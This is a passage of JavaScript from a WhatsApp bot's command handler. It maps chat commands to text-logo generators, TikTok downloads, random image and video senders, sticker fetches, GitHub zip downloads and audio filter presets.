maker.textpro("https://textpro.me/3d-underwater-text-effect-generator-online-1013.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'luxury':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-luxury-gold-text-effect-online-1003.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'glue2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'fabric':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'neonlight':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/neon-light-glitch-text-generator-online-1063.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'lava':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/lava-text-effect-online-914.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'toxic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/toxic-text-effect-online-901.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'ancient':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'christmas2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sparkles-merry-christmas-text-effect-1054.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sci_fi':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'rainbow':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'classic':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'watercolor2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweem2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'halloweenfire':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/halloween-fire-text-effect-940.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'writing':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/sand-writing-text-effect-online-990.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'foggy':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/write-text-on-foggy-window-online-free-1015.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'marvel':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'skeleton2':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'sketch':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-a-sketch-text-effect-online-1044.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'wonderful':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'batman':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/make-a-batman-logo-online-free-1066.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'juice':
   
if(!q) throw `Use ${prefix + command} text`
m.reply(mess.wait)
maker.textpro("https://textpro.me/fruit-juice-text-effect-861.html", [
    `${q}`,])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${global.botname}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuphub = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anuphub)
XeonBotInc.sendMessage(from,{image:{url:anuphub}, caption:"Here you go!"},{quoted:m})
}
break
case 'retro':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anutro2 = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anutro2)
XeonBotInc.sendMessage(from,{image:{url:anutro2}, caption:"Here you go!"},{quoted:m})
}
break
case 'horror':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anuror2 = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anuror2)
XeonBotInc.sendMessage(from,{image:{url:anuror2}, caption:"Here you go!"},{quoted:m})
}
break
case '8bit':{
if(!q) throw `Example: ${prefix + command} ajg | ea`
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anubit8 = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anubit8)
XeonBotInc.sendMessage(from,{image:{url:anubit8}, caption:"Here you go!"},{quoted:m})
}
break
case 'tiktok':{ 
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
    var button = [{ buttonId: `tiktokaudio ${q}`, buttonText: { displayText: `AUDIOâ€¡` }, type: 1 }, { buttonId: `menu`, buttonText: { displayText: `Menu` }, type: 1 }]
XeonBotInc.sendMessage(m.chat, { caption: `Here you go!`, video: { url: data.watermark }, buttons: button, footer: botname, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
if (!text) return m.reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return m.reply(`Link Invalid!!`)
m.reply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
XeonBotInc.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tiktokgirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var asupan = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokghea':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var gheayubi = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokbocil':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var bocil = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoknukhty':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ukhty = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoksantuy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var santuy = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokkayes':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var kayes = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktokpanrika':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var rikagusriani = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'tiktoknotnot':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'chinese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hijab':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'indo':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'japanese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'korean':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'malay':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomgirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomboy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'thai':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'vietnamese':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'aesthetic':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'antiwork':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'blackpink':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'bike':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/bike.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'boneka':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/boneka.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cosplay':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'cat':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/cat.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'doggo':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/doggo.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'hacking':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/hacking.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'justina':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/justina.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'kayes':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kayes.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'kpop':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/kpop.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'notnot':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/notnot.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'car':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/car.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'couplepic':case 'couplepicture':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ppcouple.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/profile.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'pubg':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/pubg.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'rose':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/rose.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ryujin':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ulzzangboy':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'ulzzanggirl':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallml.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var notnot = JSON.parse(fs.readFileSync('./HostMedia/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url }, buttons: but, footer: botname }, { quoted: m })
break

case 'rentbot': {
if (!isPremium) return sendButMessage (m.chat, prem1, prem2, prem3, { quoted:m})
jadibot(XeonBotInc, m, m.chat)
}
break
case 'rentbotlist':
try {
let user = [... new Set([...global.conns.filter(XeonBotInc => XeonBotInc.user).map(XeonBotInc => XeonBotInc.user)])]
te = "*Bot Rent List*\n\n"
for (let i of user){
let y = await XeonBotInc.decodeJid(i.id)
te += " Ã— User : @" + y.split("@")[0] + "\n"
te += " Ã— Name : " + i.name + "\n\n"
}
XeonBotInc.sendMessage(m.chat,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
m.reply(`There are no users who have rented bot yet`)
}
break
case 'git': case 'gitclone':
if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XeonBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
break
	        case 'pinterest': {
m.reply(mess.wait)
let { pinterest } = require('./lib/scraper')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
XeonBotInc.sendMessage(m.chat, { image: { url: result }, caption: 'â­” Media Url : '+result }, { quoted: m })
}
break
        case 'ringtone': {
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'stickman':
m.reply(mess.wait)
XeonBotInc.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'spongebob':
m.reply(mess.wait)
XeonBotInc.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'gojosatoru':
m.reply(mess.wait)
XeonBotInc.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'nicholas':
m.reply(mess.wait)
XeonBotInc.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`}}, {quoted: m })
break
case 'cartoon':
m.reply(mess.wait)
XeonBotInc.sendMessage(m.chat, {sticker: {url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`}}, {quoted: m })
break
		case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
